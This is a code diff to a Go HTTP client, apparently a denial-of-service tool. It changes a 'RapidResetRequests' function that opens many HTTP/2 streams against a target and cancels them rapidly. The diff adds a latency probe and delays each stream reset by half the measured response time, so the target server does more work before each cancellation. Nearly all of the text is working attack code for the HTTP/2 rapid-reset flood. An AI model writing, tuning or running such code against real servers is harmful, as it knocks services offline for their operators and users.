@@ -10,6 +10,31 @@ import (
 	"time"
 )
 
+// When the loopcounter loops (rolls over from `size` to 0),
+// `true` is passed, otherwise, false is passed.
+type LoopCounter struct {
+	size uint
+	Curr uint
+}
+
+func NewLoopCounter(size uint) LoopCounter {
+	return LoopCounter{
+		size: size,
+		Curr: 0,
+	}
+
+}
+
+// Advances the counter by 1.
+// Loops back to zero when the counter reaches maximum
+func (loop *LoopCounter) Next() {
+	if loop.Curr == loop.size {
+		loop.Curr = 0
+	} else {
+		loop.Curr += 1
+	}
+}
+
 type Client struct {
 	inner *http.Client
 
@@ -50,10 +75,7 @@ func (client *Client) RapidResetRequests(
 	go ev.Start()
 	defer terminal.StopEvent(ch)
 
-	// req, err := http.NewRequest("GET", client.targetAddress, nil)
-	// if err != nil {
-	// 	return err
-	// }
+	var loopCounter = NewLoopCounter(5)
 
 	// assume the max requests per stream is 100
 	// so we send 100 simultaneous requests and reset the first one
@@ -64,6 +86,7 @@ func (client *Client) RapidResetRequests(
 	// ticks every period: 1 / frequency
 	numNanoSeconds := 1_000_000_000 / frequency
 	var ticker time.Ticker = *time.NewTicker(time.Duration(numNanoSeconds))
+	var resetDelay time.Duration = time.Duration(time.Millisecond)
 
 	for time.Since(startTime) < duration {
 
@@ -90,7 +113,9 @@ func (client *Client) RapidResetRequests(
 			// upd8
 			ch <- uint(req_per_stream)
 
-			// perform the stream reset immediately
+			// perform the stream reset after a short interval
+			// gives the server some time to perform some computation
+			time.Sleep(resetDelay)
 			streamCancel()
 
 		}()
@@ -100,6 +125,12 @@ func (client *Client) RapidResetRequests(
 			<-ticker.C
 		}
 
+		// measure the latency here
+		// set the new delay to half of the measured latency
+		loopCounter.Next()
+		if loopCounter.Curr == 0 {
+			go client.updateRequestLatency(&resetDelay)
+		}
 	}
 
 	return nil
@@ -123,4 +154,24 @@ func (client *Client) request(
 	}
 
 	// return err
+}
+
+// Send a single request and update the latency
+func (client *Client) updateRequestLatency(delay *time.Duration) error {
+
+	start := time.Now()
+
+	req, err := http.NewRequest("GET", client.targetAddress, nil)
+	if err != nil {
+		return err
+	}
+
+	client.inner.Do(req)
+
+	end := time.Now()
+
+	// set to half of measured latency
+	*delay = time.Duration(end.Sub(start)) / 2
+
+	return nil
 }
